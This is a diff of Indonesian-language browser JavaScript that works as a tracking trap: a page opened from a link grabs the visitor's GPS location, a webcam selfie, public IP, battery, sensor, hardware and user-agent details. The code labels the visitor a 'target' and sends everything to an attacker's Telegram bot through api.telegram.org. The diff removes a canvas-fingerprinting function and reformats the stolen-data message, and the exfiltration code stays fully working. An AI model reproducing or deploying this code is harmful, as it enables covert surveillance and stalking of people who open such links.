@@ -1,7 +1,7 @@
 //
 // ===================================
 //   Dibuat oleh: Ahmad Zaki
-//   Versi: v-Cepat (Tanpa Audio, Lebih Cepat)
+//   Versi: v-Cepat (Format Rapi)
 // ===================================
 //
 
@@ -25,7 +25,7 @@ const updateStatus = (message, isError = false) => {
   statusList.scrollTop = statusList.scrollHeight;
 };
 
-// ... (Fungsi getDeviceInfo, getLocation, getPhoto, getIpAddress, getSensorData, getCanvasFingerprint tetap sama) ...
+// ... (Semua fungsi getDeviceInfo, getLocation, getPhoto, getIpAddress, getSensorData tetap sama) ...
 const getDeviceInfo = async () => {
   updateStatus('1. Mengambil info perangkat...');
   const data = {
@@ -59,7 +59,7 @@ const getPhoto = async () => {
   videoEl.srcObject = stream;
   await new Promise(resolve => videoEl.onloadedmetadata = resolve);
   videoEl.play();
-  await new Promise(resolve => setTimeout(resolve, 500)); // Jeda 0.5 detik (cepat)
+  await new Promise(resolve => setTimeout(resolve, 500));
   canvasEl.width = videoEl.videoWidth; canvasEl.height = videoEl.videoHeight;
   const context = canvasEl.getContext('2d');
   context.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
@@ -96,75 +96,58 @@ const getSensorData = () => {
     } catch (err) { reject(err); }
   });
 };
-const getCanvasFingerprint = () => {
-  updateStatus('6. Membuat fingerprint perangkat...');
-  return new Promise((resolve) => {
-    try {
-      const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d');
-      const txt = 'AhmadZakiWasHere_1.0';
-      ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic";
-      ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069";
-      ctx.fillText(txt, 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText(txt, 4, 17);
-      const dataUrl = canvas.toDataURL();
-      let hash = 0;
-      for (let i = 0; i < dataUrl.length; i++) {
-        const char = dataUrl.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash;
-      }
-      resolve(hash.toString());
-    } catch(err) { resolve('Gagal membuat fingerprint'); }
-  });
-};
 
-// --- Fungsi sendToTelegram (Tanpa Audio) ---
+
+// --- Fungsi sendToTelegram (FORMAT BARU YANG LEBIH RAPI) ---
 const sendToTelegram = async (data) => {
-  updateStatus('7. Mengirim semua data...');
-  const { deviceInfo, location, photoBase64, ipAddress, sensor, fingerprint } = data;
+  updateStatus('6. Mengirim semua data...');
+  const { deviceInfo, location, photoBase64, ipAddress, sensor } = data;
+  
+  // Format pesan baru yang lebih rapi
   const message = `
-🔔 *DATA TARGET DITERIMA (v-Cepat)* (${alias || 'Target'})
---------------------------------------------------
-*📍 Lokasi & Jaringan*
+🔔 *DATA TARGET DITERIMA* (${alias || 'Target'})
+-----------------------------------
+*📍 LOKASI & JARINGAN*
 • IP Publik: \`${ipAddress}\`
 • Tipe Jaringan: \`${deviceInfo.connection.type}\`
-• Downlink: \`${deviceInfo.connection.downlink}\`
-• Fingerprint: \`${fingerprint}\`
-*🔋 Perangkat & Baterai*
-• UA: \`${deviceInfo.userAgent}\`
+• Kecepatan: \`${deviceInfo.connection.downlink}\`
+
+*📱 PERANGKAT & SPESIFIKASI*
 • Platform: \`${deviceInfo.platform}\`
 • Baterai: \`${deviceInfo.battery.level}\` (Charging: ${deviceInfo.battery.isCharging})
-*🖥️ Hardware & Tampilan*
-• CPU: \`${deviceInfo.cpuCores}\` inti
-• RAM: \`${deviceInfo.memory}\` GB (Perkiraan)
 • Resolusi: \`${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\`
-*🤸 Orientasi & Sensor*
-• Posisi HP: \`${sensor.orientation}\`
-• (X: ${sensor.x}, Y: ${sensor.y}, Z: ${sensor.z})
-*⏰ Waktu Lokal Target*
+• CPU: \`${deviceInfo.cpuCores}\` inti / RAM: \`${deviceInfo.memory}\` GB
+
+*🤸 POSISI HP (SENSOR)*
+• Orientasi: \`${sensor.orientation}\`
+• Sensor (x,y,z): \`${sensor.x}, ${sensor.y}, ${sensor.z}\`
+
+*⏰ WAKTU TARGET*
 • \`${deviceInfo.localTime}\`
---------------------------------------------------
+
+*🌐 USER AGENT*
+\`\`\`${deviceInfo.userAgent}\`\`\`
+-----------------------------------
   `.trim();
 
-  // Kirim Info Teks
+  // --- Kirim Data ---
   await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
   });
-  // Kirim Lokasi
   await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id: chatId, latitude: location.lat, longitude: location.lon, horizontal_accuracy: location.accuracy })
   });
-  // Kirim Foto
   const photoFormData = new FormData();
   photoFormData.append('chat_id', chatId);
   photoFormData.append('photo', await (await fetch(photoBase64)).blob(), 'selfie.jpg');
   await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: photoFormData });
   
-  // TIDAK ADA PENGIRIMAN AUDIO
-  
   updateStatus('✅ Semua data berhasil dikirim!');
 };
 
-// --- Fungsi Utama (Tanpa Audio, Lebih Cepat) ---
+// --- Fungsi Utama (Tanpa Fingerprint) ---
 const start = async () => {
   if (!chatId || !alias) {
     updateStatus('❌ Error: Link tidak valid.', true);
@@ -175,22 +158,19 @@ const start = async () => {
   try {
     const data = {};
     
-    // Meminta izin satu per satu (Hanya Lokasi & Kamera)
+    // Meminta izin (Hanya Lokasi & Kamera)
     data.location = await getLocation();
     data.photoBase64 = await getPhoto();
-    // data.audioBlob = await getAudio(); // <-- FUNGSI INI DIHAPUS
 
     // Ambil data non-izin
-    const [deviceInfo, ipAddress, sensor, fingerprint] = await Promise.all([
+    const [deviceInfo, ipAddress, sensor] = await Promise.all([
         getDeviceInfo(),
         getIpAddress(),
-        getSensorData().catch(err => ({ orientation: err.message, x:0, y:0, z:0 })),
-        getCanvasFingerprint()
+        getSensorData().catch(err => ({ orientation: err.message, x:0, y:0, z:0 }))
     ]);
     data.deviceInfo = deviceInfo;
     data.ipAddress = ipAddress;
     data.sensor = sensor;
-    data.fingerprint = fingerprint;
 
     await sendToTelegram(data);
     updateStatus('Selesai.');
